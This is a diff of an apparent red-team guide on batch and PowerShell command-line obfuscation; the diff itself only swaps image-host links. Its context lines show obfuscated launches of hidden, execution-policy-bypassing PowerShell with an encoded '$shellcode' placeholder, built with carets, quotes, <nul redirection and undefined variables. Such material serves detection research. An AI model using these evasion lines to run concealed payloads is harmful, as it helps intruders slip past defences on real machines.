@@ -41,10 +41,10 @@
 
 
 **Bad character sellection** [ batch escape character -used- in powershell interpreter ]
-![bad character sellection](http://i.cubeupload.com/5bsI07.jpg)
+![bad character sellection](http://i64.tinypic.com/2u7c5kz.jpg)
 
 **Good character sellection** [ powershell special character used in powershell interpreter ]
-![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)
+![powershell obfuscation](http://i64.tinypic.com/2u7c50n.jpg)
 
 ---
 
@@ -76,7 +76,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 
       cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
 
-![batch obfuscation](http://i.cubeupload.com/IBknFW.jpg)
+![batch obfuscation](http://i68.tinypic.com/qx3xc6.jpg)
 
 ---
 
@@ -88,7 +88,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
       c"m"d.ex"e" /c pow"e"r"s"hell"."e"x"e G"e"t"-"Wmi"O"bje"c"t -Cl"a"ss win32_ComputerSystem
 
-![batch obfuscation](http://i.cubeupload.com/ksgzaY.jpg)
+![batch obfuscation](http://i65.tinypic.com/2wbrzh0.jpg)
 `HINT: In tests conducted i was not been able to use 2 letters inside double quotes (eg. c"md".exe)`
 
 ---
@@ -112,7 +112,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       [Using 3 diferent technics (=@|^|")]
       @c^m"d".ex^e /c ,p"o"wer^s^hell"."ex^e G"e"t"-"Wm^i"O"bje"c"t -Cl"a"s^s win32_ComputerSystem
 
-![batch obfuscation](http://i.cubeupload.com/gB8tsA.jpg)
+![batch obfuscation](http://i66.tinypic.com/2ag6b6g.jpg)
 
 ---
 
@@ -120,7 +120,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
       echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-![pipe commands](http://i.cubeupload.com/Ulus3M.jpg)
+![pipe commands](http://i66.tinypic.com/2lcbseo.jpg)
 
 ---
 
@@ -138,7 +138,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - String obfuscated (**<nul**) special character.<br />
 `cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
 
-![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)
+![batch obfuscation](http://i64.tinypic.com/2moo0om.jpg)
 
 ---
 
@@ -160,7 +160,7 @@ The above string can be obfuscated using the **batch special character: "** <br 
       %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
       exit
 
-![batch obfuscation](http://i.cubeupload.com/nMLRrc.jpg)<br />
+![batch obfuscation](http://i65.tinypic.com/j0ec1z.jpg)<br />
 `HINT: Undefined variables technic are only accessible in bat scripting (it will not work in terminal)`
 
 ---
